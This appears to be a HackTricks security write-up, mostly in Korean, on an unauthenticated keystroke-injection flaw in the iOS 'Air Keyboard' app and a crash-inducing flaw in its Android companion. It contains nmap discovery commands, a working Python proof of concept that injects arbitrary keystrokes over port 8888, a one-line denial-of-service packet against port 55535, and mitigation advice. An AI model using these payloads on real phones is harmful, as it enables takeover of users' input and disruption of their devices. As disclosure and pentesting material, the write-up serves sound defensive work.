# Air Keyboard Remote Input Injection (Unauthenticated TCP Listener)

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

상업용 "Air Keyboard" 애플리케이션(iOS 버전, App Store ID 6463187929)은 **포트 8888에서 평문 TCP 서비스를 열어** 인증 없이 키스트로크 프레임을 수락합니다. 동일한 Wi-Fi 네트워크에 있는 모든 장치는 해당 포트에 연결하여 피해자의 전화에 임의의 키보드 입력을 주입할 수 있으며, **완전 원격 상호작용 탈취**를 달성할 수 있습니다.

동반 Android 빌드는 **포트 55535**에서 수신 대기합니다. 약한 AES-ECB 핸드셰이크를 수행하지만, 조작된 쓰레기 데이터가 **OpenSSL 복호화 루틴에서 처리되지 않은 예외를 발생시켜** 백그라운드 서비스를 충돌시킵니다(**DoS**).

## 1. Service Discovery

로컬 네트워크를 스캔하고 앱에서 사용하는 두 개의 고정 포트를 찾습니다:
```bash
# iOS (input-injection)
nmap -p 8888 --open 192.168.1.0/24

# Android (weakly-authenticated service)
nmap -p 55535 --open 192.168.1.0/24
```
안드로이드 핸드셋에서는 책임 있는 패키지를 로컬에서 식별할 수 있습니다:
```bash
adb shell netstat -tulpn | grep 55535     # no root required on emulator

# rooted device / Termux
netstat -tulpn | grep LISTEN
ls -l /proc/<PID>/cmdline                # map PID → package name
```
## 2. 프레임 형식 (iOS)

이진 파일은 `handleInputFrame()` 루틴 내에서 다음과 같은 파싱 로직을 드러냅니다:
```
[length (2 bytes little-endian)]
[device_id (1 byte)]
[payload ASCII keystrokes]
```
선언된 길이는 `device_id` 바이트를 포함하지만 **헤더 자체의** 두 바이트는 포함하지 않습니다.

## 3. Exploitation PoC
```python
#!/usr/bin/env python3
"""Inject arbitrary keystrokes into Air Keyboard for iOS"""
import socket, sys

target_ip = sys.argv[1]                  # e.g. 192.168.1.50
keystrokes = b"open -a Calculator\n"     # payload visible to the user

frame  = bytes([(len(keystrokes)+1) & 0xff, (len(keystrokes)+1) >> 8])
frame += b"\x01"                         # device_id = 1 (hard-coded)
frame += keystrokes

with socket.create_connection((target_ip, 8888)) as s:
s.sendall(frame)
print("Injected", keystrokes)
```
인쇄 가능한 모든 ASCII(`\n`, `\r`, 특수 키 등 포함)는 전송될 수 있으며, 이는 공격자에게 물리적 사용자 입력과 동일한 권한을 부여합니다: 앱 실행, IM 전송, 피싱 URL 방문 등.

## 4. Android Companion – 서비스 거부

Android 포트(55535)는 **하드코딩된 AES-128-ECB 키**로 암호화된 4자리 비밀번호와 랜덤 논스를 기대합니다. 파싱 오류는 `AES_decrypt()`로 전파되며 포착되지 않아 리스너 스레드가 종료됩니다. 따라서 단일 잘못된 패킷만으로도 프로세스가 다시 시작될 때까지 합법적인 사용자가 연결이 끊어지게 할 수 있습니다.
```python
import socket
socket.create_connection((victim, 55535)).send(b"A"*32)  # minimal DoS
```
## 5. Root Cause

1. **수신 프레임에 대한 출처 / 무결성 검사 없음** (iOS).
2. **암호화 오용** (정적 키, ECB, 길이 검증 누락) 및 **예외 처리 부족** (Android).

## 6. Mitigations & Hardening Ideas

* 모바일 핸드셋에서 인증되지 않은 서비스를 노출하지 마십시오.
* 온보딩 중 장치별 비밀을 파생하고 입력 처리를 하기 전에 이를 검증하십시오.
* 리스너를 `127.0.0.1`에 바인딩하고 원격 제어를 위해 상호 인증된 암호화된 전송(예: TLS, Noise)을 사용하십시오.
* 모바일 보안 검토 중 예상치 못한 열린 포트를 감지하십시오 (`netstat`, `lsof`, `frida-trace` on `socket()` 등).
* 최종 사용자로서: Air Keyboard를 제거하거나 신뢰할 수 있는 격리된 Wi-Fi 네트워크에서만 사용하십시오.

## Detection Cheat-Sheet (Pentesters)
```bash
# Quick one-liner to locate vulnerable devices in a /24
nmap -n -p 8888,55535 --open 192.168.1.0/24 -oG - | awk '/Ports/{print $2,$3,$4}'

# Inspect running sockets on a connected Android target
adb shell "for p in $(lsof -PiTCP -sTCP:LISTEN -n -t); do echo -n \"$p → "; cat /proc/$p/cmdline; done"
```
## References

- [Air Keyboard iOS 앱의 원격 입력 주입 취약점 여전히 패치되지 않음](https://www.mobile-hacker.com/2025/07/17/remote-input-injection-vulnerability-in-air-keyboard-ios-app-still-unpatched/)
- [CXSecurity 권고 WLB-2025060015](https://cxsecurity.com/issue/WLB-2025060015)

{{#include ../../banners/hacktricks-training.md}}
